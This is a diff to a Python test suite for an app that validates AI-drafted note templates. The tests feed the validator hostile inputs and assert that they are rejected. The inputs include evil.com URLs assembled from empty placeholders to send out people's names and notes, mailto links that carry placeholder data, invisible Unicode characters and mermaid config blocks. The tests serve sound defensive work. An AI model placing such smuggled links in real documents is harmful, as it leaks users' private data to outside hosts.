@@ -1129,7 +1129,6 @@ def test_run_turn_turns_any_provider_failure_into_a_generate_error(monkeypatch):
     assert str(e.value) == generate.PROVIDER_FAILED and "reset" not in str(e.value)
 
 
-
 class _NoAllowlist(_Provider):
     supports_tool_allowlist = False
 
@@ -1154,3 +1153,148 @@ def test_the_refusal_names_exactly_the_providers_that_can_draft():
     assert generate.CANNOT_DRAFT_MESSAGE == (
         "AI templates need a provider that can run without tools: switch to claude or a "
         "local/OpenAI-compatible model in settings")
+
+
+# ── Final review fixes ────────────────────────────────────────────────────
+
+from ghostbrain.templates.starters import ONE_ON_ONE  # noqa: E402
+
+
+def _one_on_one(body: str) -> str:
+    return ONE_ON_ONE.rstrip("\n") + "\n\n" + body + "\n"
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        # {{user.name}} is empty for most users: the URL appears only then
+        "See ww{{user.name}}w.evil.com/{{person.name}}/{{focus}}",
+        "ht{{user.name}}tps:evil.com/{{person.name}}",
+        "```mermaid\nflowchart TD\nA-->B\nstyle A fill:url(ht{{user.name}}tps:evil.com/{{person.name}})\n```",
+        # any placeholder that may render empty, not only user.name
+        "ww{{context}}w.evil.com",
+        "ht{{focus}}tps:evil.com",
+        "da{{date | format: YYYY}}ta:x",
+    ],
+)
+def test_a_url_assembled_from_empty_placeholders_is_rejected(body):
+    assert url_problems(_one_on_one(body))
+
+
+def test_the_rendered_note_is_checked_with_an_empty_user_name(monkeypatch):
+    seen = []
+    real = generate.render
+
+    def spy(template, answers, env):
+        seen.append(env.user_name)
+        return real(template, answers, env)
+
+    monkeypatch.setattr(generate, "render", spy)
+    assert check_draft(GOOD).ok
+    assert "" in seen and SAMPLE_ENV.user_name in seen
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        # the slashes between placeholders in folders and names stay fine
+        "Filed under {{date | format: YYYY}}/{{person.name}}/{{focus}}.",
+        "Week {{date | format: YYYY}}:{{date | format: MM}}/notes",
+        "{{person.name}}{{focus}} metadata: none",
+    ],
+)
+def test_placeholders_next_to_slashes_still_pass(body):
+    assert check_draft(_one_on_one(body)).ok
+
+
+@pytest.mark.parametrize(
+    "link",
+    [
+        "[a](mailto:x@evil.com?body=(x){{focus}})",
+        "[a](mailto:x@evil.com?body=\\){{focus}})",
+        "![a](p.png?(x){{focus}})",
+        "[r]: mailto:x@evil.com?body=(x){{focus}}",
+    ],
+)
+def test_a_placeholder_anywhere_after_a_link_opener_is_rejected(link):
+    problems = forbidden(_one_on_one(link))
+    assert any(generate.draft_rules.PLACEHOLDER_URL in d.message for d in problems)
+
+
+@pytest.mark.parametrize(
+    "char",
+    ["‮", "​", "\U000e0041", "⁦", "­", "‍"],
+)
+def test_invisible_formatting_characters_are_rejected(char):
+    problems = forbidden(GOOD.replace("## Blockers", f"## Block{char}ers"))
+    assert any(d.message == "invisible formatting characters are not allowed" and d.line == BLOCKERS_LINE
+               for d in problems)
+
+
+def test_a_zero_width_joiner_inside_an_emoji_sequence_passes():
+    assert check_draft(GOOD.replace("## Blockers", "## Team \U0001f468‍\U0001f469‍\U0001f467")).ok
+    assert check_draft(GOOD.replace("## Blockers", "## Flag \U0001f3f3️‍\U0001f308")).ok
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        "```mermaid\n---\ntitle: x\nconfig:\n  theme: dark\n---\ngraph TD\nA-->B\n```",
+        "```mermaid\n---\n\"config\": {theme: dark}\n---\ngraph TD\n```",
+        "- ```mermaid\n  ---\n  config:\n    look: handDrawn\n  ---\n  graph TD\n  ```",
+    ],
+)
+def test_mermaid_config_frontmatter_is_rejected(body):
+    problems = forbidden(GOOD.replace("## Blockers", body))
+    assert any("diagram config" in d.message for d in problems)
+
+
+def test_mermaid_frontmatter_with_a_title_only_passes():
+    assert check_draft(GOOD.replace("## Blockers", "```mermaid\n---\ntitle: Flow\n---\ngraph TD\nA-->B\n```")).ok
+
+
+@pytest.mark.parametrize(
+    ("message", "shown"),
+    [
+        ("Error: spawn /Users/alex/.npm/bin/claude ENOENT at /Users/alex/x.js:12", generate.PROVIDER_FAILED),
+        ("local model: Connection refused to 10.0.0.5:11434", generate.PROVIDER_FAILED),
+        ("429 rate limited by upstream /Users/alex/secret", generate.RATE_LIMITED),
+        ("poltergeist took longer than 180s and was stopped.",
+         "poltergeist took longer than 180s and was stopped."),
+    ],
+)
+def test_provider_error_text_is_not_returned_verbatim(monkeypatch, caplog, message, shown):
+    monkeypatch.setattr("ghostbrain.llm.providers.get_provider",
+                        lambda cfg=None: _Provider([{"type": "error", "message": message}]))
+    with caplog.at_level("WARNING", logger="ghostbrain.templates.generate"), \
+            pytest.raises(GenerateError) as e:
+        run_turn("p", turn_key="k")
+    assert str(e.value) == shown
+    if shown != message:
+        assert message in caplog.text
+
+
+def test_known_provider_messages_are_shown_as_they_are(monkeypatch):
+    from ghostbrain.llm.agent import BINARY_MISSING_MESSAGE, MCP_BINARY_MISSING_MESSAGE
+    from ghostbrain.llm.providers.base import ALLOWLIST_REFUSED
+
+    for message in (BINARY_MISSING_MESSAGE, MCP_BINARY_MISSING_MESSAGE, ALLOWLIST_REFUSED):
+        monkeypatch.setattr("ghostbrain.llm.providers.get_provider",
+                            lambda cfg=None, m=message: _Provider([{"type": "error", "message": m}]))
+        with pytest.raises(GenerateError) as e:
+            run_turn("p", turn_key="k")
+        assert str(e.value) == message
+
+
+def test_llm_error_text_is_not_returned_verbatim(monkeypatch):
+    from ghostbrain.llm.client import LLMError
+
+    class _Raises(_Provider):
+        def chat(self, req):
+            raise LLMError("claude failed: /Users/alex/.claude/settings.json is broken")
+            yield  # pragma: no cover
+
+    monkeypatch.setattr("ghostbrain.llm.providers.get_provider", lambda cfg=None: _Raises([]))
+    with pytest.raises(GenerateError) as e:
+        run_turn("p", turn_key="k")
+    assert str(e.value) == generate.PROVIDER_FAILED
